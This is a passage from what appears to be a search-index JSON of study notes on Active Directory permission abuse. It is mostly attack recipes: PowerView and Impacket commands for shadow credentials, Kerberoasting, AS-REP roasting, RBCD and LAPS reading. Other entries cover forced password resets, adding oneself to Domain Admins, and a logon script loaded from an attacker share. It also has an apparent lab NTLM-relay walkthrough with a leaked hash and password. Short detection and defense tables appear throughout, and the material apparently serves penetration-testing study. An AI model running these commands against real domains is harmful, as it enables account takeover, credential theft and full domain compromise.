msDS-KeyCredentialLink"},{"id":"attack-1-shadow-credentials-best-attack","u":"02_permissions-abuse.html#attack-1-shadow-credentials-best-attack","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Attack 1: Shadow Credentials (Best Attack)","c":"📌 What it is Abuse msDS-KeyCredentialLink to add your own authentication key. ⚙️ Steps Set-DomainObject -Identity victim -Set @{'msDS-KeyCredentialLink'=$value} 🧠 Explanation You inject a certificate/key AD trusts it for authentication No password needed ✅ Result 👉 Full account takeover"},{"id":"attack-2-spn-manipulation-kerberoasting","u":"02_permissions-abuse.html#attack-2-spn-manipulation-kerberoasting","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Attack 2: SPN Manipulation → Kerberoasting","c":"📌 What it is Add fake SPN → request service ticket → crack password ⚙️ Steps Set-DomainObject -Identityvictim -Set @{'servicePrincipalName'='fake/service'} impacket-GetUserSPNs domain.local/user:pass-request 🧠 Explanation SPN makes account “service account” Kerberos gives encrypted ticket Offline cracking possible ✅ Result 👉 Recover plaintext password"},{"id":"attack-3-as-rep-roasting","u":"02_permissions-abuse.html#attack-3-as-rep-roasting","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Attack 3: AS-REP Roasting","c":"📌 What it is Disable pre-authentication requirement ⚙️ Steps Set-DomainObject -Identity victim -XOR @{'userAccountControl'=4194304} impacket-GetNPUsers domain.local/-no-pass 🧠 Explanation Removes Kerberos pre-auth DC sends encrypted response ✅ Result 👉 Crackable hash"},{"id":"attack-4-logon-script-injection","u":"02_permissions-abuse.html#attack-4-logon-script-injection","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Attack 4: Logon Script Injection","c":"📌 What it is Set malicious script path ⚙️ Steps Set-DomainObject -Identity victim-Set @{'scriptPath'='\\\\attacker\\share\\evil.ps1'}"},{"id":"explanation","u":"02_permissions-abuse.html#explanation","sec":"Permissions Abuse","lvl":4,"t":"🧠 Explanation","c":"Script runs when user logs in ✅ Result 👉 Code execution as victim ⚠️ Password Reset? ❌ Not directly possible (in most cases)"},{"id":"b.-genericwrite-on-group","u":"02_permissions-abuse.html#b.-genericwrite-on-group","sec":"Permissions Abuse","lvl":4,"t":"👥 B. GenericWrite on GROUP","c":"🧠 What you can modify member attribute (group membership)"},{"id":"attack-add-yourself-to-group","u":"02_permissions-abuse.html#attack-add-yourself-to-group","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Attack: Add Yourself to Group","c":"⚙️ Steps Add-DomainGroupMember -Identity \"Domain Admins\" -Members attacker 🧠 Explanation You modify group membership No approval needed ✅ Result Target Group | Impact | — | — | Domain Admins | 🚨 Full domain compromise | Administrators | Local admin | Remote Desktop Users | Lateral movement |"},{"id":"attack-flow","u":"02_permissions-abuse.html#attack-flow","sec":"Permissions Abuse","lvl":4,"t":"🔥 Attack Flow","c":"GenericWrite on Group ↓ Add yourself ↓ Inherit group privileges ↓ Privilege escalation"},{"id":"c.-genericwrite-on-computer","u":"02_permissions-abuse.html#c.-genericwrite-on-computer","sec":"Permissions Abuse","lvl":4,"t":"💻 C. GenericWrite on COMPUTER","c":"🧠 What you can modify msDS-AllowedToActOnBehalfOfOtherIdentity servicePrincipalName"},{"id":"attack-1-rbcd-most-important","u":"02_permissions-abuse.html#attack-1-rbcd-most-important","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Attack 1: RBCD (Most Important)","c":"📌 What it is Resource-Based Constrained Delegation ⚙️ Steps Set-DomainObject-IdentityTARGET$-Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$attackerSID} 🧠 Explanation You allow your machine to act on behalf of users Use Kerberos delegation Impersonate Administrator ✅ Result 👉 SYSTEM / Domain Admin access"},{"id":"attack-2-spn-abuse","u":"02_permissions-abuse.html#attack-2-spn-abuse","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Attack 2: SPN Abuse","c":"⚙️ Steps Set-DomainObject -Identity computer$ -Set @{'servicePrincipalName'='fake/service'} 🧠 Explanation Same as user SPN abuse ✅ Result 👉 Extract machine hash"},{"id":"genericwrite-on-ou-requested","u":"02_permissions-abuse.html#genericwrite-on-ou-requested","sec":"Permissions Abuse","lvl":4,"t":"🔐 5. GenericWrite on OU (Requested)","c":"📌 What is it? GenericWrite on OU = You can modify attributes of OU 👉 But: You cannot directly control users You must abuse inheritance / permissions 🎯 Goal 👉 Gain control over objects inside OU (users / groups)"},{"id":"abuse-method-grant-yourself-rights-on-ou","u":"02_permissions-abuse.html#abuse-method-grant-yourself-rights-on-ou","sec":"Permissions Abuse","lvl":4,"t":"⚙️ Abuse Method: Grant Yourself Rights on OU","c":"⚔️ Step 1 — Modify OU ACL Add-DomainObjectAcl -TargetIdentity \"OU=IT,DC=domain,DC=local\" -PrincipalIdentity attacker -RightsAll 🧠 What this does 👉 You are: Giving yourself FullControl on the OU ↓ Permissions will be inherited by child objects (if inheritance applies)"},{"id":"important-condition","u":"02_permissions-abuse.html#important-condition","sec":"Permissions Abuse","lvl":4,"t":"⚠️ Important Condition","c":"✔ Works only if: Inheritance is enabled Objects inherit permissions from OU"},{"id":"step-2-abuse-child-objects","u":"02_permissions-abuse.html#step-2-abuse-child-objects","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Step 2 — Abuse Child Objects","c":"Now you can:"},{"id":"reset-user-passwords","u":"02_permissions-abuse.html#reset-user-passwords","sec":"Permissions Abuse","lvl":4,"t":"Reset user passwords","c":"Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString \"P@ss123!\" -AsPlainText-Force)"},{"id":"add-yourself-to-groups","u":"02_permissions-abuse.html#add-yourself-to-groups","sec":"Permissions Abuse","lvl":4,"t":"Add yourself to groups","c":"Add-DomainGroupMember -Identity \"Admins\" -Members attacker"},{"id":"full-attack-flow","u":"02_permissions-abuse.html#full-attack-flow","sec":"Permissions Abuse","lvl":4,"t":"🔥 Full Attack Flow","c":"GenericWrite on OU ↓ Modify OU ACL (give yourself control) ↓ Permissions propagate to users/groups ↓ Control child objects ↓ Privilege escalation"},{"id":"summary-table","u":"02_permissions-abuse.html#summary-table","sec":"Permissions Abuse","lvl":4,"t":"📊 5. Summary Table","c":"Object | Technique | Impact | — | — | — | User | Shadow Credentials | 🚨 Full takeover | User | SPN → Kerberoast | Password crack | User | AS-REP Roast | Hash extraction | User | Logon Script | Code execution | Group | Add member | 🚨 Privilege escalation | Computer | RBCD | 🚨 SYSTEM / DA | Computer | SPN abuse | Hash cracking |"},{"id":"risks-impact","u":"02_permissions-abuse.html#risks-impact","sec":"Permissions Abuse","lvl":4,"t":"🚨 6. Risks / Impact","c":"Risk | Description | — | — | Privilege escalation | Add yourself to admin groups | Credential theft | Kerberoasting / AS-REP | Persistence | Shadow credentials | Lateral movement | RBCD / group abuse | Stealth access | No password reset needed |"},{"id":"logs-detection","u":"02_permissions-abuse.html#logs-detection","sec":"Permissions Abuse","lvl":4,"t":"🪵 7. Logs & Detection","c":"Event ID | Description | — | — | 5136 | Directory object modified | 4728 | User added to group | 4769 | Kerberos service ticket (SPN abuse) | 4768 | AS-REP requests |"},{"id":"key-takeaway","u":"02_permissions-abuse.html#key-takeaway","sec":"Permissions Abuse","lvl":4,"t":"💡 8. Key Takeaway","c":"👉 GenericWrite = Attribute abuse, not direct control"},{"id":"ntml-relay-attack-rbcd-linux-poc","u":"02_permissions-abuse.html#ntml-relay-attack-rbcd-linux-poc","sec":"Permissions Abuse","lvl":3,"t":"NTML Relay Attack + RBCD ( Linux PoC )","c":"**#WEB01 - 10.129.1.166** clocksync 10.129.1.166 -c \"netexec ldap 10.129.1.166 -u ms01$ -p ms01 -M maq -k\" clocksync 10.129.1.217 -c \"evil-winrm -i 192.168.100.2 -u gMSA_ADFS_prod$ -H fd9ea7ac7820dba5155bd6ed2d850c09\" gMSA_ADFS_prod$ : fd9ea7ac7820dba5155bd6ed2d850c09 image.png image.png python3 Coercer.py coerce -l 10.10.16.60 -t 192.168.100.2 -d pirate.htb -u 'gMSA_ADFS_prod$' --hashes ':fd9ea7ac7820dba5155bd6ed2d850c09' --always-continue impacket-ntlmrelayx \\ -t ldaps://10.129.1.217 \\ --delegate-access \\ --no-da -smb2support \\ --remove-mic \\ --debug image.png image.png image.png clocksync 10.129.1.217 -c \"nxc ldap 10.129.1.217 -u ms01$ -p ms01 --computers -k\" image.png clocksync 10.129.1.217 -c 'impacket-getST pirate.htb/SWJFVMVD$:jD3U@VgYfz+Wj}> -spn cifs/WEB01.pirate.htb -impersonate Administrator -dc-ip 10.129.1.217' clocksync 10.129.1.172 -c 'impacket-getST pirate.htb/SWJFVMVD$:jD3U@VgYfz+Wj}> -spn HTTP/WEB01.pirate.htb -impersonate Administrator -dc-ip 10.129.1.172' export KRB5CCNAME=Administrator@HTTP_WEB01.pirate.htb@PIRATE.HTB.ccache env | grep KRB image.png image.png clocksync 10.129.1.172 -c \"evil-winrm -i WEB01.pirate.htb -r PIRATE.HTB\" image.png"},{"id":"generic-all","u":"02_permissions-abuse.html#generic-all","sec":"Permissions Abuse","lvl":2,"t":"Generic All","c":""},{"id":"what-is-genericall","u":"02_permissions-abuse.html#what-is-genericall","sec":"Permissions Abuse","lvl":4,"t":"📌 1. What is GenericAll?","c":"GenericAll = Full control over an AD object 👉 You can: Read all attributes Modify all attributes Change permissions (ACL) Perform sensitive operations (like password reset)"},{"id":"prerequisites-1","u":"02_permissions-abuse.html#prerequisites-1","sec":"Permissions Abuse","lvl":4,"t":"🎯 2. Prerequisites","c":"Requirement | Explanation | — | — | Domain access | Valid domain user | GenericAll permission | On target object | Network access | LDAP / SMB / RPC to DC | Target object | User / Group / Computer / OU |"},{"id":"conditions-for-abuse-1","u":"02_permissions-abuse.html#conditions-for-abuse-1","sec":"Permissions Abuse","lvl":4,"t":"⚙️ 3. Conditions for Abuse","c":"Condition | Why Important | — | — | Object type matters | Abuse differs | AdminSDHolder protection | May restrict changes | Privileged target | Determines impact | Inheritance (OU) | Can affect multiple objects |"},{"id":"abuse-based-on-object-type-1","u":"02_permissions-abuse.html#abuse-based-on-object-type-1","sec":"Permissions Abuse","lvl":4,"t":"🔥 4. Abuse Based on Object Type","c":""},{"id":"a.-genericall-on-user","u":"02_permissions-abuse.html#a.-genericall-on-user","sec":"Permissions Abuse","lvl":4,"t":"👤 A. GenericAll on USER","c":"🧠 What you control 👉 Everything: Password SPNs UAC flags ACLs Authentication methods"},{"id":"attack-1-reset-password-most-direct","u":"02_permissions-abuse.html#attack-1-reset-password-most-direct","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Attack 1: Reset Password (MOST DIRECT)","c":"⚙️ Steps Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString \"P@ss123!\"-AsPlainText-Force) 🧠 Explanation GenericAll includes ResetPassword No old password required ✅ Result 👉 Instant account takeover"},{"id":"attack-2-shadow-credentials-best-attack","u":"02_permissions-abuse.html#attack-2-shadow-credentials-best-attack","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Attack 2: Shadow Credentials (Best Attack)","c":"📌 What it is Abuse msDS-KeyCredentialLink to add your own authentication key. ⚙️ Steps Set-DomainObject -Identity victim -Set @{'msDS-KeyCredentialLink'=$value} 🧠 Explanation You inject a certificate/key AD trusts it for authentication No password needed ✅ Result 👉 Full account takeover"},{"id":"attack-3-spn-manipulation-kerberoasting","u":"02_permissions-abuse.html#attack-3-spn-manipulation-kerberoasting","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Attack 3: SPN Manipulation → Kerberoasting","c":"📌 What it is Add fake SPN → request service ticket → crack password ⚙️ Steps Set-DomainObject -Identityvictim -Set @{'servicePrincipalName'='fake/service'} impacket-GetUserSPNs domain.local/user:pass-request 🧠 Explanation SPN makes account “service account” Kerberos gives encrypted ticket Offline cracking possible ✅ Result 👉 Recover plaintext password"},{"id":"attack-4-as-rep-roasting","u":"02_permissions-abuse.html#attack-4-as-rep-roasting","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Attack 4: AS-REP Roasting","c":"📌 What it is Disable pre-authentication requirement ⚙️ Steps Set-DomainObject -Identity victim -XOR @{'userAccountControl'=4194304} impacket-GetNPUsers domain.local/-no-pass 🧠 Explanation Removes Kerberos pre-auth DC sends encrypted response ✅ Result 👉 Crackable hash"},{"id":"attack-5-grant-yourself-more-rights","u":"02_permissions-abuse.html#attack-5-grant-yourself-more-rights","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Attack 5: Grant Yourself More Rights","c":"Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity attacker -RightsAll ✅ Result 👉 Persistence / stealth control"},{"id":"b.-genericall-on-group","u":"02_permissions-abuse.html#b.-genericall-on-group","sec":"Permissions Abuse","lvl":4,"t":"👥 B. GenericAll on GROUP","c":"🧠 What you control Membership Group permissions Attributes"},{"id":"attack-1-add-yourself-to-group","u":"02_permissions-abuse.html#attack-1-add-yourself-to-group","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Attack 1: Add Yourself to Group","c":"Add-DomainGroupMember -Identity \"Domain Admins\" -Members attacker 🧠 Explanation Full control → modify member attribute ✅ Result Group | Impact | — | — | Domain Admins | 🚨 Full domain compromise | Administrators | Local admin | Custom privileged group | Priv esc |"},{"id":"c.-genericall-on-computer","u":"02_permissions-abuse.html#c.-genericall-on-computer","sec":"Permissions Abuse","lvl":4,"t":"💻 C. GenericAll on COMPUTER","c":""},{"id":"attack-1-rbcd-most-powerful","u":"02_permissions-abuse.html#attack-1-rbcd-most-powerful","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Attack 1: RBCD (Most Powerful)","c":"Set-DomainObject -Identity TARGET$ -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$attackerSID} 🧠 Explanation Allow your machine to impersonate users ✅ Result 👉 SYSTEM / Domain Admin access"},{"id":"attack-2-reset-machine-password","u":"02_permissions-abuse.html#attack-2-reset-machine-password","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Attack 2: Reset Machine Password","c":"net user TARGET$ NewPass123!/domain ✅ Result 👉 Control computer account"},{"id":"attack-3-spn-abuse","u":"02_permissions-abuse.html#attack-3-spn-abuse","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Attack 3: SPN Abuse","c":"Set-DomainObject -Identity TARGET$ -Set @{'servicePrincipalName'='fake/service'} ✅ Result 👉 Kerberoasting"},{"id":"abuse-path-2-laps-abuse-very-important","u":"02_permissions-abuse.html#abuse-path-2-laps-abuse-very-important","sec":"Permissions Abuse","lvl":4,"t":"⚔️ 4. Abuse Path 2: LAPS Abuse (VERY IMPORTANT)","c":"🧠 What is LAPS? LAPS = Local Administrator Password Solution Stores local admin password in AD attribute: ms-Mcs-AdmPwd 🔐 Normally Only privileged users can read it 🔥 With GenericAll 👉 You can: Grant yourself permission to read LAPS password ⚙️ Step 1: Give yourself read access Add-DomainObjectAcl -TargetIdentity TARGET$ -PrincipalIdentity attacker -RightsAll ⚙️ Step 2: Read LAPS password Get-DomainComputer TARGET$ -Propertie sms-Mcs-AdmPwd Name : TARGET ms-Mcs-AdmPwd : P@ssw0rd123! 💥 Impact You now have: Local Administrator credentials on TARGET machine ⚔️ Step 3: Use it psexec \\\\TARGET -u Administrator -p P@ssw0rd123! cmd.exe NT AUTHORITY\\SYSTEM shell 🔥 Why LAPS Abuse is Powerful GenericAll → Read LAPS → Local Admin → SYSTEM → Credential Dump"},{"id":"d.-genericall-on-ou-very-important-final-version","u":"02_permissions-abuse.html#d.-genericall-on-ou-very-important-final-version","sec":"Permissions Abuse","lvl":4,"t":"🗂️ D. GenericAll on OU (VERY IMPORTANT — FINAL VERSION)","c":"🧠 What you control 👉 If you have GenericAll on an OU , you control: The OU object itself (FULL CONTROL) 👉 Since an OU is a container , it holds: Users Groups Computers"},{"id":"core-logic-most-important","u":"02_permissions-abuse.html#core-logic-most-important","sec":"Permissions Abuse","lvl":4,"t":"🔥 Core Logic (MOST IMPORTANT)","c":"OU = container Objects inside OU = child objects Permissions on OU ↓ (inheritance) Flow to child objects 👉 So: GenericAll on OU ↓ You can push permissions to all child objects ↓ You gain control over those objects"},{"id":"attack-proper-flow","u":"02_permissions-abuse.html#attack-proper-flow","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Attack (Proper Flow)","c":""},{"id":"step-1-you-already-have-genericall-on-ou","u":"02_permissions-abuse.html#step-1-you-already-have-genericall-on-ou","sec":"Permissions Abuse","lvl":4,"t":"🔹 Step 1 — You already have GenericAll on OU","c":"Attacker has full control over OU=IT 👉 This allows you to: Modify permissions (ACL) Control how access is inherited"},{"id":"step-2-ensure-control-over-child-objects","u":"02_permissions-abuse.html#step-2-ensure-control-over-child-objects","sec":"Permissions Abuse","lvl":4,"t":"🔹 Step 2 — Ensure control over child objects","c":"Add-DomainObjectAcl -TargetIdentity \"OU=IT,DC=domain,DC=local\" -PrincipalIdentityattacker -RightsAll"},{"id":"what-this-does-critical","u":"02_permissions-abuse.html#what-this-does-critical","sec":"Permissions Abuse","lvl":4,"t":"🧠 What this does (CRITICAL)","c":"Adds an ACL entry on the OU ↓ Marked as inheritable ↓ Applies to child objects (users/groups/computers) 👉 Result: Attacker now has rights ON child objects"},{"id":"step-3-abuse-child-objects","u":"02_permissions-abuse.html#step-3-abuse-child-objects","sec":"Permissions Abuse","lvl":4,"t":"🔹 Step 3 — Abuse child objects","c":"Now you can directly interact with objects inside OU: ✔ Reset user passwords Set-DomainUserPassword -Identity user1 -AccountPassword (ConvertTo-SecureString \"P@ss123!\" -AsPlainText-Force) ✔ Add yourself to privileged groups Add-DomainGroupMember -Identity \"Admins\"-Members attacker ✔ Modify user attributes (SPN / persistence) Set-DomainObject-Identityuser1-Set @{'servicePrincipalName'='fake/service'} ✔ Abuse computers (RBCD) Set-DomainObject -Identity COMPUTER$ -Set @{'msDS-AllowedToActOnBehalfOfOtherIdentity'=$attackerSID}"},{"id":"result","u":"02_permissions-abuse.html#result","sec":"Permissions Abuse","lvl":4,"t":"📊 Result","c":"GenericAll on OU ↓ Control over OU ACL ↓ Permissions inherited by child objects ↓ Control users / groups / computers ↓ Mass compromise"},{"id":"important-conditions-real-world","u":"02_permissions-abuse.html#important-conditions-real-world","sec":"Permissions Abuse","lvl":4,"t":"⚠️ Important Conditions (Real World)","c":"Condition | Impact | — | — | Inheritance enabled | ✅ Works | AdminSDHolder (privileged users) | ❌ Blocks inheritance | Objects in OU | Must exist inside that OU |"},{"id":"summary-table-1","u":"02_permissions-abuse.html#summary-table-1","sec":"Permissions Abuse","lvl":4,"t":"📊 5. Summary Table","c":"Object | Abuse | Impact | — | — | — | User | Reset password | 🚨 Full takeover | User | Shadow creds | Stealth persistence | User | SPN / ASREP | Credential theft | Group | Add member | 🚨 Priv esc | Computer | RBCD | 🚨 SYSTEM / DA | Computer | Reset password | Machine takeover | OU | Control all objects | 🚨 Mass compromise |"},{"id":"risks-impact-1","u":"02_permissions-abuse.html#risks-impact-1","sec":"Permissions Abuse","lvl":4,"t":"🚨 6. Risks / Impact","c":"Risk | Description | — | — | Full account takeover | Immediate access | Domain compromise | If admin targeted | Persistence | ACL / shadow creds | Lateral movement | Across systems | Stealth attacks | No password reset needed |"},{"id":"logs-detection-1","u":"02_permissions-abuse.html#logs-detection-1","sec":"Permissions Abuse","lvl":4,"t":"🪵 7. Logs & Detection","c":"Event ID | Description | — | — | 4724 | Password reset | 4728 | Added to group | 5136 | Object modified | 4769 | Kerberos ticket request |"},{"id":"key-takeaway-1","u":"02_permissions-abuse.html#key-takeaway-1","sec":"Permissions Abuse","lvl":4,"t":"💡 8. Key Takeaway","c":"👉 GenericAll = Full control = Multiple attack paths"},{"id":"force-password-change-abuse-ad","u":"02_permissions-abuse.html#force-password-change-abuse-ad","sec":"Permissions Abuse","lvl":3,"t":"🔐 Force Password Change Abuse (AD)","c":""},{"id":"what-is-it","u":"02_permissions-abuse.html#what-is-it","sec":"Permissions Abuse","lvl":4,"t":"📌 1. What is it?","c":"Force Password Change = Ability to reset another user’s password without knowing the current password . 👉 This is controlled by the AD permission: ResetPassword Often comes via: GenericAll GenericWrite AllExtendedRights"},{"id":"prerequisites-2","u":"02_permissions-abuse.html#prerequisites-2","sec":"Permissions Abuse","lvl":4,"t":"🎯 2. Prerequisites","c":"Requirement | Explanation | — | — | Domain access | You must be a valid domain user | Permission on target user | ResetPassword or equivalent | Network access to DC | LDAP / SMB / RPC connectivity | Target account | Any user (including admins if misconfigured) |"},{"id":"conditions-for-abuse-2","u":"02_permissions-abuse.html#conditions-for-abuse-2","sec":"Permissions Abuse","lvl":4,"t":"⚙️ 3. Conditions for Abuse","c":"Condition | Why it matters | — | — | You have GenericAll on user | Full control → reset password | You have GenericWrite | Can modify attributes → sometimes enough | You have AllExtendedRights | Includes password reset | Target is not protected | AdminSDHolder may block changes | Account is enabled | Otherwise no login |"},{"id":"ways-to-abuse","u":"02_permissions-abuse.html#ways-to-abuse","sec":"Permissions Abuse","lvl":4,"t":"🔥 4. Ways to Abuse","c":"🧪 Method 1: PowerView Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString \"P@ss123!\" -AsPlainText-Force) ✔ What happens: Password is directly changed No old password required 🧪 Method 2: net user (Windows) net user victim NewP@ss123! /domain ✔ Simple built-in method ✔ Works if permissions allow 🧪 Method 3: BloodyAD (Linux) bloodyAD --host DC_IP -d domain.local -u attacker -p passset password victim NewP@ss123! ✔ Very common in labs ✔ Uses LDAP 🧪 Method 4: Impacket (rpcclient / smbpasswd) rpcclient -U domain/attacker%pass DC_IP set userinfo2 victim23 NewP@ss123! ✔ Uses SAMR protocol 🧪 Method 5: CrackMapExec crackmapexec smb DC_IP -u attacker -p pass -M pwdreset -o USER=victim PASS=NewP@ss123!"},{"id":"resetpassword-direct-right","u":"02_permissions-abuse.html#resetpassword-direct-right","sec":"Permissions Abuse","lvl":4,"t":"🔐 1. ResetPassword (Direct Right)","c":"🧠 What you have You directly have the Reset Password extended right on a user. ⚔️ Abuse PowerView Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString \"P@ss123!\" -AsPlainText-Force) Linux (rpcclient) rpcclient -U domain/attacker%pass DC_IP set userinfo2 victim23 NewP@ss123! ⚙️ What happens internally Uses SAMR / LDAP password reset operation No old password required ✅ Result 👉 Instant account takeover"},{"id":"genericall-full-control","u":"02_permissions-abuse.html#genericall-full-control","sec":"Permissions Abuse","lvl":4,"t":"🔐 2. GenericAll (Full Control)","c":"🧠 What you have Full control over user object ⚔️ Abuse Same as above (because it includes ResetPassword): Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString \"P@ss123!\" -AsPlainText-Force) ⚙️ Internally You already have all rights No need to modify ACL ✅ Result 👉 Direct password reset"},{"id":"allextendedrights","u":"02_permissions-abuse.html#allextendedrights","sec":"Permissions Abuse","lvl":4,"t":"🔐 3. AllExtendedRights","c":"🧠 What you have All extended rights → includes ResetPassword ⚔️ Abuse bloodyAD --host DC_IP -d domain.local -u attacker-p passset password victim NewP@ss123! ⚙️ Internally Extended rights include: ResetPassword ChangePassword Others ✅ Result 👉 Works same as GenericAll for this case"},{"id":"genericwrite-tricky-case","u":"02_permissions-abuse.html#genericwrite-tricky-case","sec":"Permissions Abuse","lvl":4,"t":"🔐 4. GenericWrite (⚠️ Tricky Case)","c":"🧠 What you have Write access to attributes (NOT full control) ⚠️ Important You usually CANNOT directly reset password"},{"id":"possible-abuse-paths","u":"02_permissions-abuse.html#possible-abuse-paths","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Possible Abuse Paths","c":"🧪 Case 1: Target allows password write (rare) Some environments allow writing: Set-ADAccountPassword -Identityvictim -Reset-NewPassword (ConvertTo-SecureString \"P@ss123!\" -AsPlainText-Force) ✔ Might work ❌ Often fails due to missing extended right ⚙️ Internally You’re modifying attributes, NOT performing reset operation ✅ Result 👉 Sometimes → indirect takeover 👉 Not reliable for password reset"},{"id":"writedacl-very-powerful","u":"02_permissions-abuse.html#writedacl-very-powerful","sec":"Permissions Abuse","lvl":4,"t":"🔐 5. WriteDACL (VERY POWERFUL)","c":"🧠 What you have Ability to modify permissions (ACL) of user"},{"id":"abuse-flow","u":"02_permissions-abuse.html#abuse-flow","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Abuse Flow","c":"Step 1 — Give yourself ResetPassword Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity attacker -RightsResetPassword"},{"id":"step-2-reset-password","u":"02_permissions-abuse.html#step-2-reset-password","sec":"Permissions Abuse","lvl":4,"t":"Step 2 — Reset password","c":"Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString \"P@ss123!\" -AsPlainText-Force) ⚙️ Internally Modify DACL → grant yourself rights Use those rights ✅ Result 👉 Full takeover (2-step attack)"},{"id":"writeowner","u":"02_permissions-abuse.html#writeowner","sec":"Permissions Abuse","lvl":4,"t":"🔐 6. WriteOwner","c":"🧠 What you have Ability to change owner of object"},{"id":"abuse-flow-1","u":"02_permissions-abuse.html#abuse-flow-1","sec":"Permissions Abuse","lvl":4,"t":"⚔️ Abuse Flow","c":"Step 1 — Take ownership Set-DomainObjectOwner -Identity victim -OwnerIdentity attacker Step 2 — Modify DACL Add-DomainObjectAcl -TargetIdentity victim -PrincipalIdentity attacker -RightsResetPassword Step 3 — Reset password Set-DomainUserPassword -Identity victim -AccountPassword (ConvertTo-SecureString \"P@ss123!\" -AsPlainText-Force) ⚙️ Internally Ownership → allows modifying permissions → grant yourself rights ✅ Result 👉 Full takeover (3-step chain)"},{"id":"final-truth-table","u":"02_permissions-abuse.html#final-truth-table","sec":"Permissions Abuse","lvl":4,"t":"🧠 Final Truth Table","c":"Permission | Can Reset Password? | Notes | — | — | — | ResetPassword | ✅ YES | Direct right | GenericAll | ✅ YES | Full control | AllExtendedRights | ✅ YES | Includes reset | GenericWrite | ⚠️ SOMETIMES | Not guaranteed | WriteDACL | ✅ INDIRECT | Add reset right | WriteOwner | ✅ INDIRECT | Take control → add rights | 🧠 What you gain Scenario | Result | — | — | Reset normal user | Full account takeover | Reset admin | Domain compromise | Reset service account | Kerberoasting / lateral movement |"},{"id":"important-notes-very-important","u":"02_permissions-abuse.html#important-notes-very-important","sec":"Permissions Abuse","lvl":4,"t":"⚠️ 5. Important Notes (VERY IMPORTANT)","c":"🔴 This is NOT password cracking No brute force No hash needed Direct overwrite 🔴 Kerberos impact Old tickets become invalid New authentication required"},{"id":"logs-detection-2","u":"02_permissions-abuse.html#logs-detection-2","sec":"Permissions Abuse","lvl":4,"t":"📊 6. Logs & Detection","c":"🪵 Windows Event Logs Event ID | Description | — | — | 4724 | Password reset attempt | 4738 | User account changed | 4624 | New login after reset |"},{"id":"example-log","u":"02_permissions-abuse.html#example-log","sec":"Permissions Abuse","lvl":4,"t":"📍 Example Log","c":"Event ID: 4724 Subject: attacker_user Target: victim_user Action: Password Reset"},{"id":"detection-clues","u":"02_permissions-abuse.html#detection-clues","sec":"Permissions Abuse","lvl":4,"t":"🔍 Detection Clues","c":"Sudden password reset for privileged user Reset followed by login from different host Unusual admin account activity"},{"id":"risks-impact-2","u":"02_permissions-abuse.html#risks-impact-2","sec":"Permissions Abuse","lvl":4,"t":"🚨 7. Risks / Impact","c":"Risk | Explanation | — | — | Account takeover | Immediate access | Privilege escalation | Reset admin → DA | Persistence | Attacker controls password | Lateral movement | Use credentials across network | Service disruption | Services using account may break |"},{"id":"defensive-measures","u":"02_permissions-abuse.html#defensive-measures","sec":"Permissions Abuse","lvl":4,"t":"🛡️ 8. Defensive Measures","c":"Control | Description | — | — | Least privilege | Remove unnecessary rights | Monitor 4724 | Alert on password resets | Protect admin accounts | AdminSDHolder enforcement | Tiered model | Separate admin/user accounts | MFA | Reduce impact after reset |"},{"id":"write-dacl","u":"02_permissions-abuse.html#write-dacl","sec":"Permissions Abuse","lvl":2,"t":"Write DACL","c":""},{"id":"what-is-writedacl-core-concept","u":"02_permissions-abuse.html#what-is-writedacl-core-concept","sec":"Permissions Abuse","lvl":4,"t":"🧠 1. What is WriteDACL (Core Concept)","c":"🔐 DACL Basics Every AD object (user, group, computer, OU, domain) has a DACL (Discretionary Access Control List) DACL = list of ACEs (Access Control Entries) ACE = who has what permission on this object"},{"id":"what-writedacl-means","u":"02_permissions-abuse.html#what-writedacl-means","sec":"Permissions Abuse","lvl":4,"t":"🔥 What WriteDACL Means","c":"WriteDACL = Ability to modify permissions of an object You can: Add new ACEs Modify existing ACEs Grant yourself any permission 👉 This is why it’s dangerous: With WriteDACL → you can give yourself full control (GenericAll) or any specific right"},{"id":"core-idea-very-important","u":"02_permissions-abuse.html#core-idea-very-important","sec":"Permissions Abuse","lvl":4,"t":"⚠️ Core Idea (Very Important)","c":"👉 WriteDACL is NOT direct control 👉 It is permission escalation primitive WriteDACL → Modify ACL → Give yourself stronger rights → Abuse those rights"},{"id":"conditions-required-for-abuse","u":"02_permissions-abuse.html#conditions-required-for-abuse","sec":"Permissions Abuse","lvl":4,"t":"🎯 2. Conditions Required for Abuse","c":""},{"id":"required-conditions","u":"02_permissions-abuse.html#required-conditions","sec":"Permissions Abuse","lvl":4,"t":"✅ Required Conditions","c":"1. You control a principal (user/computer) Your account OR compromised account 2. That principal has WriteDACL on target object Example: User A → WriteDACL → User B 3. Target object is valuable OR chainable High privilege user Privileged group Computer (for delegation attacks) OU / Domain (mass impact)"},{"id":"key-understanding","u":"02_permissions-abuse.html#key-understanding","sec":"Permissions Abuse","lvl":4,"t":"🧠 Key Understanding","c":"From theory: If object B has rights over object A → controlling B = controlling A"},{"id":"abuse-logic-universal-flow","u":"02_permissions-abuse.html#abuse-logic-universal-flow","sec":"Permissions Abuse","lvl":4,"t":"⚔️ 3. Abuse Logic (Universal Flow)","c":"Same for ALL objects: Step 